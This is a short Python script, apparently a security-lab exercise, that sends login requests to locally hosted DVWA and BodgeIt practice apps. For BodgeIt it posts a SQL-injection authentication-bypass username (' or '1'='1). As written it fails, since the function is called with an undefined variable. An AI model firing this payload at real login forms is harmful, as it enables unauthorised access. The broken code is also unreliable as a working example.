import requests
import sys


class customauth():
	# commented out since we will be taking the input from args
	#site = input("what site?")
	# takes in the argument from the command line and decides which hardcoded authentication to use
	def getsite(site):
		#will ignore case of text by making it lower, use the admin and password credentials
		if site.lower() == 'dvwa':
	    		url = 'http://127.0.0.1/dvwa/login.php'
	    		payload = {
    	    		'action'  : 'login',
			'username': 'admin',
    	    		'password': 'password'
	   		}
		#will ignore case of text by making it lower and uses sql injection for the admin login
		if site.lower() == 'bodgeit':
	    		url = 'http://127.0.0.1:8080/bodgeit/login.jsp'
	    		payload = {
			'action'  : 'login',
    	    		'username': "admin@thebodgeitstore.com' or '1'='1",
    	    		'password': ''
	    		}

		p = requests.post(url, data=payload)
		print(p.text)
	getsite(site)
